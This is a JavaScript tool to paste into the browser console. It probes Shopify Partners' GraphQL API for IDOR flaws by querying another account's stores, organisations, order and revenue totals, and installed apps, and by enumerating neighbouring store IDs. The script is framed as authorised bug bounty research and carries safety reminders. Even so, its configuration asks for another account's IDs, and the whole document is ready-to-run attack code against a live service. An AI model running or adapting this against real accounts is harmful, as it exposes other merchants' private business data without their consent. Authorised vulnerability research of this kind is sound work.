/**
 * Shopify Partners GraphQL IDOR Tester
 * Paste this into browser DevTools console while logged into partners.shopify.com
 * For authorized bug bounty research only.
 */

const ShopifyIDORTester = {

  // Configuration - UPDATE THESE
  config: {
    ownStoreId: "YOUR_OWN_STORE_ID",      // Your test store ID
    targetStoreId: "TARGET_STORE_ID",      // Other account's store ID to test
    ownOrgId: "YOUR_ORG_ID",               // Your organization ID
    targetOrgId: "TARGET_ORG_ID",          // Other account's org ID
  },

  results: [],

  async query(graphqlQuery, variables = {}) {
    const response = await fetch('/api/graphql', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ query: graphqlQuery, variables })
    });
    return response.json();
  },

  async runTest(testName, query, variables) {
    console.log(`\n[*] Running: ${testName}`);
    console.log(`    Variables:`, variables);

    try {
      const start = Date.now();
      const result = await this.query(query, variables);
      const duration = Date.now() - start;

      const hasData = result.data && Object.values(result.data).some(v => v !== null);
      const hasErrors = !!result.errors;

      const testResult = {
        test: testName,
        variables,
        duration,
        hasData,
        hasErrors,
        response: result
      };

      this.results.push(testResult);

      if (hasData && !hasErrors) {
        console.log(`    [!] POTENTIAL IDOR - Data returned:`, result.data);
        return { vulnerable: true, result };
      } else if (hasErrors) {
        console.log(`    [+] Access denied:`, result.errors[0]?.message);
        return { vulnerable: false, result };
      } else {
        console.log(`    [+] No data returned (null)`);
        return { vulnerable: false, result };
      }
    } catch (error) {
      console.log(`    [!] Error:`, error.message);
      return { vulnerable: false, error };
    }
  },

  // ============================================
  // Test Cases
  // ============================================

  tests: {
    // Test 1: Direct store access by ID
    storeAccess: {
      query: `
        query TestStore($id: ID!) {
          store(id: $id) {
            id
            name
            myshopifyDomain
            createdAt
          }
        }
      `,
      getVariables: (cfg) => ({ id: `gid://partners/Store/${cfg.targetStoreId}` })
    },

    // Test 2: Organization access
    orgAccess: {
      query: `
        query TestOrg($id: ID!) {
          organization(id: $id) {
            id
            name
            stores(first: 5) {
              edges { node { id name } }
            }
          }
        }
      `,
      getVariables: (cfg) => ({ id: `gid://partners/Organization/${cfg.targetOrgId}` })
    },

    // Test 3: Store analytics/metrics
    storeMetrics: {
      query: `
        query TestMetrics($storeId: ID!) {
          store(id: $storeId) {
            id
            name
            analytics {
              totalOrders
              totalRevenue
            }
          }
        }
      `,
      getVariables: (cfg) => ({ storeId: `gid://partners/Store/${cfg.targetStoreId}` })
    },

    // Test 4: Store apps listing
    storeApps: {
      query: `
        query TestApps($storeId: ID!) {
          store(id: $storeId) {
            id
            installedApps(first: 10) {
              edges {
                node {
                  id
                  title
                }
              }
            }
          }
        }
      `,
      getVariables: (cfg) => ({ storeId: `gid://partners/Store/${cfg.targetStoreId}` })
    },

    // Test 5: Numeric ID enumeration
    storeEnumeration: {
      query: `
        query TestEnum($id: ID!) {
          store(id: $id) {
            id
            name
          }
        }
      `,
      // Test with incremented IDs
      getVariables: (cfg) => {
        const baseId = parseInt(cfg.ownStoreId);
        return { id: `gid://partners/Store/${baseId + 1}` };
      }
    }
  },

  // ============================================
  // Runner Functions
  // ============================================

  async runAllTests() {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║          SHOPIFY PARTNERS IDOR TEST SUITE                     ║
╚══════════════════════════════════════════════════════════════╝
    `);

    console.log("[*] Configuration:");
    console.log(`    Own Store ID:    ${this.config.ownStoreId}`);
    console.log(`    Target Store ID: ${this.config.targetStoreId}`);
    console.log(`    Own Org ID:      ${this.config.ownOrgId}`);
    console.log(`    Target Org ID:   ${this.config.targetOrgId}`);

    if (this.config.targetStoreId === "TARGET_STORE_ID") {
      console.error("\n[!] ERROR: Update config with real IDs first!");
      console.log("    ShopifyIDORTester.config.targetStoreId = 'actual_id';");
      return;
    }

    this.results = [];
    const vulnerable = [];

    for (const [name, test] of Object.entries(this.tests)) {
      const variables = test.getVariables(this.config);
      const result = await this.runTest(name, test.query, variables);
      if (result.vulnerable) {
        vulnerable.push(name);
      }
      // Small delay between tests
      await new Promise(r => setTimeout(r, 500));
    }

    console.log(`\n${'='.repeat(60)}`);
    console.log("SUMMARY");
    console.log('='.repeat(60));
    console.log(`Total tests: ${Object.keys(this.tests).length}`);
    console.log(`Potential vulnerabilities: ${vulnerable.length}`);

    if (vulnerable.length > 0) {
      console.log(`\n[!!!] POTENTIAL IDOR IN: ${vulnerable.join(', ')}`);
      console.log("[!] Validate manually and prepare report if confirmed.");
    } else {
      console.log("\n[+] No obvious IDOR detected. Consider testing:");
      console.log("    - Different query types");
      console.log("    - Mutations (carefully)");
      console.log("    - Edge cases in parameters");
    }

    console.log("\n[*] Full results stored in: ShopifyIDORTester.results");
    return this.results;
  },

  async testSingleStore(storeId) {
    console.log(`\n[*] Quick test for store ID: ${storeId}`);
    return this.runTest('quickStoreTest', this.tests.storeAccess.query, {
      id: `gid://partners/Store/${storeId}`
    });
  },

  async testSingleOrg(orgId) {
    console.log(`\n[*] Quick test for org ID: ${orgId}`);
    return this.runTest('quickOrgTest', this.tests.orgAccess.query, {
      id: `gid://partners/Organization/${orgId}`
    });
  },

  exportResults() {
    const blob = new Blob([JSON.stringify(this.results, null, 2)],
      { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `idor_results_${Date.now()}.json`;
    a.click();
    console.log("[+] Results exported to file");
  },

  help() {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║          SHOPIFY PARTNERS IDOR TESTER - HELP                  ║
╚══════════════════════════════════════════════════════════════╝

SETUP:
------
1. Update configuration:
   ShopifyIDORTester.config.ownStoreId = "12345";
   ShopifyIDORTester.config.targetStoreId = "67890";
   ShopifyIDORTester.config.ownOrgId = "111";
   ShopifyIDORTester.config.targetOrgId = "222";

COMMANDS:
---------
ShopifyIDORTester.runAllTests()     - Run all IDOR tests
ShopifyIDORTester.testSingleStore('123')  - Test single store ID
ShopifyIDORTester.testSingleOrg('456')    - Test single org ID
ShopifyIDORTester.exportResults()   - Download results as JSON
ShopifyIDORTester.results           - View raw results array

FINDING IDs:
------------
- Store IDs: Look in Network tab for GraphQL responses
- Org IDs: Check URL (partners.shopify.com/ORGID/...)
- Or run a legitimate query and inspect the response

SAFETY:
-------
- Only test stores YOU control
- Stop if you access unintended data
- Report immediately if vulnerability found
    `);
  }
};

// Auto-display help
console.log("[+] ShopifyIDORTester loaded. Run ShopifyIDORTester.help() for usage.");
